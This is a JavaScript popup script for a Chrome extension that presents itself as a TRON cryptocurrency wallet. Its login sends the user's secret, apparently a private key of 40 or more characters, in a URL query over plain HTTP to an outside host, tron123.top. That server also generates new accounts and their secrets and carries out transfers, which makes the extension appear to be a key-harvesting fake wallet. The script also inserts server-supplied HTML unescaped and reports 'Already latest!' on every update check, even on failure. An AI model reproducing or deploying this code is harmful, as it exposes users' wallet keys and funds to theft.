var baseURL = "http://tron123.top";
$(function() {
	//chrome.storage.sync.clear(function(){});

	
	var assetNumJson = null;
	initAsset();
		
	var ele = document.getElementById("copy-container");
	var clipboard = new ClipboardJS(ele);
	$('#login-btn').click(function(e){
		$("#loading").show();
		if( $("#password-box").val().length < 40) {
			e.preventDefault();
			$("#loading").hide();
			$("#password-box").focus();
			return false;
		}
		login($('#login-btn'),$("#password-box").val());
	});
	
	function login(ele,password){
		ele.html("loading...");
		
		var xhr = new XMLHttpRequest();
		xhr.open("POST", baseURL + "/wallet/doLogin" + "?from=chrome&password=" + password, true);
		xhr.onreadystatechange = function() {
			if (xhr.readyState == 4) {
				var res = JSON.parse(xhr.responseText);
				if(res.status && res.status == 1){
					assetNumJson = res;
					initImage(res.address);
					refreshAsset();
					$("#totalAssetValue").html((res.price*res.TRX).toFixed(3));
					$('#login-section').removeClass("visible");
					$('#register-section').removeClass("visible");
					$("#loading").hide();
					$('#main-section').addClass("visible");
				}else{
					$("#loading").hide();
					ele.html("LOG IN");
				}
			}
		}
		xhr.send();
	}

	$('.tab').click(function(){
		$('.tab').removeClass("active");
		$(this).addClass("active");		
		$('.tab-content').removeClass("visible");
		$('#' + $(this).attr('id') + '-content').addClass("visible");
	});

	$('.head-icon').click(function(){
		$('.tab').removeClass("active");
		$('#settings-tab').addClass("active");	
		$('.tab-content').removeClass("visible");
		$('#settings-tab-content').addClass("visible");
	});
	
	$('.add-icon').click(function(){
	  $("#loading").show();
	  var xhr = new XMLHttpRequest();
	  xhr.open("GET", "https://api.tronscan.org/api/token?sort=-name", true);
	  xhr.onreadystatechange = function() {
		if (xhr.readyState == 4) {
		  var resp = JSON.parse(xhr.responseText);
		  var resultHtml = "";
		  var defaultConfig = {displayAsset:[]}; // 默认配置
			chrome.storage.sync.get(defaultConfig, function(items) {
				for(var i in resp.data){
					var showFlag = false;
					for(var j in items.displayAsset){
						if(items.displayAsset[j] == resp.data[i].name){
							showFlag = true;
							break;
						}
					}
					resultHtml += ("<li class=\"setting-li\">" + 
					  "<span class=\"text\">" + resp.data[i].name + "</span>" + 
					  "<div class=\"checkbox\">" + 
						"<input type=\"checkbox\" class=\"toggle\" " + (showFlag? "checked=\"true\"":"") + ">" + 
						"<label class=\"label\"></label>" + 
					  "</div></li>");
				  }
				  injectCustomJs('injectAssetList');
				 $("#asset-container").html(resultHtml);
				 $("#loading").hide();
				 $('#main-section').removeClass("visible");
				$('#asset-select-section').addClass("visible");
			});  
		 
		}
	  }
	  xhr.send(); 		
	});
	$('#asset-select-back').click(function(){
		refreshAsset();
		$('#main-section').addClass("visible");
		$('#asset-select-section').removeClass("visible");
		
	});
	$('#asset-send-back').click(function(){
		$('#asset-detail-section').addClass("visible");
		$('#asset-send-section').removeClass("visible");
		
	});
	$('#asset-receive-back').click(function(){
		$('#asset-detail-section').addClass("visible");
		$('#asset-receive-section').removeClass("visible");
		
	});
	$('#asset-detail-back').click(function(){
		$('#main-section').addClass("visible");
		$('#asset-detail-section').removeClass("visible");
		
	});
	$('#freezeContainer').click(function(){
		$('#main-section').removeClass("visible");
		$('#asset-freeze-section').addClass("visible");	
	});
	$('#pushSettingContainer').click(function(){
		$('#main-section').removeClass("visible");
		$('#asset-pushsetting-section').addClass("visible");	
	});	
	$('#asset-pushsetting-back').click(function(){
		$('#asset-pushsetting-section').removeClass("visible");
		$('#main-section').addClass("visible");	
	});
	$('#asset-freeze-back').click(function(){
		$('#asset-freeze-section').removeClass("visible");
		$('#main-section').addClass("visible");	
	});	
	
	$('#send-tab').click(function(){
		$("#asset-remain").html($("#asset-num").html());
		$("#send-to-address").val("");
		$("#send-amount").val("0");
		$("#send-to-address").focus();
		$('#asset-send-section').addClass("visible");
		$('#main-section').removeClass("visible");
		
	});
	$('#receive-tab').click(function(){
		var ele2 = document.getElementById("copy-qr");
		var clipboard2 = new ClipboardJS(ele2);
		$("#receive-title").html("Receive " + $("#asset-desc").html());
		$("#receive-amount").val("0");
		$("#receive-to-address").focus();
		$('#asset-receive-section').addClass("visible");
		$('#main-section').removeClass("visible");

		
	});
	$("#receive-amount").on('input',function(e){
		var address = $("#receive-to-address").val();
		var amount = $("#receive-amount").val();
		amount = parseFloat(amount);
		if(amount <= 0){
			$("#receive-amount").focus();
			return false;
		}
		var asset = $("#asset-desc").html();
		var url = baseURL + "/wallet/send?toAddress=" + address + "&amount=" + amount + "&asset=" + asset;
		$("#qrcode").html("");
		$("#qrcode").qrcode({width: 200,height: 200,correctLevel:0,render: "table",text: url});
		$("#copy-qr").attr("data-clipboard-text",url);
	});
	
	$('#register-to').click(function(){
		$('#login-section').addClass("visible");
		$('#register-section').removeClass("visible");
		
	});
	$('#log-out').click(function(){
		$("#loading").show();
		var xhr = new XMLHttpRequest();
		xhr.open("POST", baseURL + "/wallet/logout", true);
		xhr.onreadystatechange = function() {
			if (xhr.readyState == 4) {
				$("#loading").hide();
				$('#login-section').addClass("visible");
				$('#main-section').removeClass("visible");
			}else{
				$("#loading").hide();
			}
		}
		xhr.send();		
		
	});
	$('#login-to').click(function(){		
		generateAccount();		
	});
	$('#register-next-btn').click(function(){		
		generateAccount();		
	});
	$('#register-ok-btn').click(function(){		
		login($('#register-ok-btn'),$("#register-password").val());
	});
	$('#accounts-tab').click(function(){
		$('#main-section').addClass("visible");
		$("#loading").show();
		var xhr = new XMLHttpRequest();
		xhr.open("GET", baseURL + "/wallet/getNews", true);
		xhr.onreadystatechange = function() {
			if (xhr.readyState == 4) {
				$("#loading").hide();
				var res = JSON.parse(xhr.responseText);
				res = JSON.parse(res.list);
				var resultHtml = "";
				for (var i=0; i< res.length;i++) {
					resultHtml += "<div class=\"control clear\">" +
									"<div class=\"grade2\"></div>" + 
									"<div class=\"intro\">" +
										"<div class=\"time\">" + res[i].time + "</div>" +  
										"<div class=\"content\">" + 
											"<div class=\"news-title\">" + res[i].title + "</div>" +  
											res[i].content + 
										"</div>" + 
									"</div>" +
								"</div>"
				}
				$("#news-container").html(resultHtml);
			}
		}
		xhr.send();
	});
	
	$('#messages-tab').click(function(){
		initAsset();
	});

	$('#tools-tab').click(function(){
		$('#main-section').addClass("visible");
		$("#loading").show();
		var xhr = new XMLHttpRequest();
		xhr.open("GET", baseURL + "/wallet/getMarket", true);
		xhr.onreadystatechange = function() {
			if (xhr.readyState == 4) {
				$("#loading").hide();
				var res = JSON.parse(xhr.responseText);
				res = JSON.parse(res.list);
				var resultHtml = "<ul><li class=\"name oltext\">Market</li> <li class=\"price oltext\">Price</li> <li class=\"oltext\">Rate</li></ul>";
				for (var i=0; i< res.length;i++) {
					resultHtml += ("<ul><a href=\"" + res[i].domain + "\" target=\"_blank\"><li class=\"name\"><img src=\""+ res[i].logo +"\">" + 
						 res[i].name
					  + "</li> <li class=\"price chartUp\">￥" + res[i].price
					  + "</li> <li><div class=\"digital-" + (res[i].rate.indexOf("+")>=0 ? "up":"down") + "\">" 
					  +  res[i].rate + "</div></li></a></ul>");
				}
				$("#market-container").html(resultHtml);
			}
		}
		xhr.send();
	});
	
	$('#send-btn').click(function(){
		var xhr = new XMLHttpRequest();
		var address = $("#send-to-address").val();
		if(address.length != 34){
			$("#send-to-address").focus();
			return false;
		}
		var amount = $("#send-amount").val();
		amount = parseFloat(amount);
		if(amount <= 0 || amount > parseFloat($("#asset-remain").html())){
			$("#send-amount").focus();
			return false;
		}
		$("#loading").show();
		var asset = $("#asset-desc").html();
		xhr.open("get", baseURL + "/wallet/send?toAddress=" + address + "&amount=" + amount + "&asset=" + asset, false);
		xhr.onreadystatechange = function() {
			if (xhr.readyState == 4) {
				var res = JSON.parse(xhr.responseText);
				if(res.code && res.code == 1){
					$("#loading").hide();
					initAsset();
					$('#asset-send-section').removeClass("visible");
					$('#asset-detail-section').removeClass("visible");
					$('#main-section').addClass("visible");
				}else{
					$("#loading").hide();
					$("#error-tips").show();
					setTimeout(function() {$("#error-tips").hide();},3000);
				}
			}
		}
		xhr.send();
	});
	
	$('#getFreeTRX').click(function(){
		$("#loading").show();
		var xhr = new XMLHttpRequest();
		xhr.open("get", baseURL + "/wallet/getFreeTRX", true);
		xhr.onreadystatechange = function() {
			if (xhr.readyState == 4) {
				$("#loading").hide();
				var res = JSON.parse(xhr.responseText);
				if(res.code && res.code == 1){					
					$("#loading").hide();
					toastr.success("Success!");
					toastr.clear();
				}else{
					$("#loading").hide();
					toastr.error("Fail!");
					toastr.clear();
				}
			}else{
				$("#loading").hide();
				toastr.error("Fail!");
				toastr.clear();
			}
		}
		xhr.send();
	});

	$('#freeze-btn').click(function(){
		var frozenNum = $("#freeze-amount").val();
		if(frozenNum <=0 || frozenNum > $("#asset-remain-freeze").html()){
			$("#freeze-amount").focus();
			return;
		}
		$("#loading").show();
		var xhr = new XMLHttpRequest();
		xhr.open("get", baseURL + "/wallet/freeze?frozenBalance=" + frozenNum, true);
		xhr.onreadystatechange = function() {
			if (xhr.readyState == 4) {
				var res = JSON.parse(xhr.responseText);
				if(res.code && res.code == 1){					
					$("#loading").hide();
					toastr.success("Success!");
					toastr.clear();
				}else{
					toastr.error("Fail!");
					$("#loading").hide();
					toastr.clear();
				}
			}else{
				toastr.error("Fail!");
				$("#loading").hide();
				toastr.clear();
			}
		}
		xhr.send();
	});
		
	$('#unFreezeContainer').click(function(){
		$("#loading").show();
		var xhr = new XMLHttpRequest();
		xhr.open("get", baseURL + "/wallet/unfreeze", true);
		xhr.onreadystatechange = function() {
			if (xhr.readyState == 4) {
				$("#loading").hide();
				var res = JSON.parse(xhr.responseText);
				if(res.code && res.code == 1){					
					$("#loading").hide();
					toastr.success("Success!");
					toastr.clear();
				}else{
					toastr.error("Fail!");
					$("#loading").hide();
					toastr.clear();
				}
			}else{
				toastr.error("Fail!");
				$("#loading").hide();
				toastr.clear();
			}
		}
		xhr.send();
	});

	$('#updateContainer').click(function(){
		$("#loading").show();
		var xhr = new XMLHttpRequest();
		xhr.open("get", baseURL + "/wallet/checkUpdate", true);
		xhr.onreadystatechange = function() {
			if (xhr.readyState == 4) {
				$("#loading").hide();
				var res = JSON.parse(xhr.responseText);
				if(res.code && res.code == 1){					
					$("#loading").hide();
					toastr.success("Already latest!");
					toastr.clear();
				}else{
					toastr.success("Already latest!");
					$("#loading").hide();
					toastr.clear();
				}
			}else{
				toastr.success("Already latest!");
				$("#loading").hide();	
				toastr.clear();
			}
		}
		xhr.send();
	});

	function randomImageIndex(max){
		return Math.floor(Math.random()*max + 1);
	}

	function generateAccount(){
		var xhr = new XMLHttpRequest();
		xhr.open("POST", baseURL + "/wallet/generate", false);
		xhr.onreadystatechange = function() {
			if (xhr.readyState == 4) {
				var res = JSON.parse(xhr.responseText);
				$("#register-address").val(res.address);
				$("#register-password").val(res.password);
				$('#login-section').removeClass("visible");
				$('#register-section').addClass("visible");
			}
		}
		xhr.send();
	}

	function initImage(address){
		$("#send-from-address").val(address);
		$("#receive-to-address").val(address);
		$("#ower-address").html(format(address,10));
		$("#copy-container").attr("data-clipboard-text",address);	
		var url = baseURL + "/wallet/send?toAddress=" + address + "&amount=0&asset=TRX";
		$("#qrcode").qrcode({width: 200,height: 200,correctLevel:0,render: "table",text: url});
		$("#copy-qr").attr("data-clipboard-text",url);
		chrome.storage.sync.get({icon:(address + "_0")},function(items){
			var iconImageIndex = items.icon;
			iconImageIndex = iconImageIndex.substring(iconImageIndex.indexOf("_")+1);
			if(typeof(iconImageIndex) == "undefined" || iconImageIndex == 0){
				iconImageIndex = randomImageIndex(22);
				chrome.storage.sync.set({icon:(address + "_" + iconImageIndex)},function(){});
			}
			$(".head-icon").attr("src","/static/imgs/head/" + iconImageIndex + ".png");

		});	
	}

	function initAsset(){		
		var xhr = new XMLHttpRequest();
		xhr.open("POST", baseURL + "/wallet/getLatestAsset", true);
		xhr.onreadystatechange = function() {
			if (xhr.readyState == 4) {
				var res = JSON.parse(xhr.responseText);
				if(res.code && res.code == 1){
					$('#login-section').removeClass("visible");
					$('#main-section').addClass("visible");
					assetNumJson = res;
					refreshAsset();
					initImage(res.address);
					$("#totalAssetValue").html((res.price*res.TRX).toFixed(3));
					$("#asset-remain-freeze").html(res.TRX);
				}else{
					$('#login-section').addClass("visible");
					$('#main-section').removeClass("visible");
				}
			}
		}
		xhr.send();
	}
	
	function refreshAsset(){
		chrome.storage.sync.get({displayAsset:[]},function(items){
			var assetGroup = items.displayAsset;
			var resultHtml = ("<li class=\"trx-assets\"><div class=\"left\">" + 
					"<img src=\"/static/imgs/tron.png\" class=\"icon fit-dpi\">" + 
					"<span>TRX</span></div>" + 
					"<span class=\"right\">" + assetNumJson["TRX"] + "</span></li>"); 
			var assetNum = 0;
			for(var j=0; j< assetGroup.length;j++){
				if(assetNumJson.hasOwnProperty(assetGroup[j])){
					assetNum = assetNumJson[assetGroup[j]];
				}
				resultHtml += ("<li class=\"trx-assets\"><div class=\"left\">" + 
					"<img src=\"/static/imgs/assets.png\" class=\"icon\">" + 
					"<span>" + assetGroup[j] + "</span></div>" + 
					"<span class=\"right\">" + assetNum + "</span></li>");
			};
			injectCustomJs('injectAssetIndex');
			$("#asset-list").html(resultHtml);
		});
	};	

	$('.setting-li').click(function(){
			if(!$(this).hasClass("on")){
				return;
			}
			var checkBox = $(this).find("input");
			if(checkBox.prop("checked")){
				checkBox.prop("checked",false);
			}else{			
				checkBox.prop("checked",true);
				var opt = {  
					type: 'basic',  
					title: 'new message title!',  
					message: 'a new message comming~',  
					iconUrl: '/static/imgs/notification.png',  
				}  
				chrome.notifications.create('', opt, function(id){  
					setTimeout(function(){  
					chrome.notifications.clear(id, function(){});  
					}, 3000);  
				});  
			}
		});
});

function injectCustomJs(jsName){
	if($("#" + jsName).length > 0){
		return;
	}
	jsPath = '/static/js/' + jsName + '.js';
	var temp = document.createElement('script');
	temp.setAttribute('type', 'text/javascript');
	temp.setAttribute('id', jsName);
	temp.src = chrome.extension.getURL(jsPath);
	temp.onload = function(){
		this.parentNode.removeChild(this);
	};
	document.head.appendChild(temp);
}

function format(str,index){
	var pre = str.substring(0,index);
	var post = str.substring(str.length-index);
	return pre + "..." + post;
}